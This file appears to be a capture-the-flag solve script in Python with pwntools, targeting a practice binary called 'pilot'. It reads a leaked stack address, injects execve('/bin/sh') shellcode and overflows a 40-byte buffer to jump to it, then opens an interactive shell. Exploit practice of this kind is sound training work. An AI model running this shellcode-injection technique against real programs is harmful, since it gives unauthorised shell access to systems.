#!/usr/bin/python3

from pwn import *

context.log_level = 'debug'
e = context.binary = ELF("/tmp/pilot", checksec=False)
p = process()

p.recvuntil(b"Location:")
leak = int(p.recvline().strip(), 16)
log.success(f"Stack leak: {hex(leak)}")

shell = asm(
        '''
        mov rax, 29400045130965551
        push rax

        mov rax, 0x3b
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        syscall
        ''', arch = "amd64")

payload = shell + b'A'*(40 - len(shell)) + p64(leak)
p.sendafter(b"Command:", payload)

p.interactive()
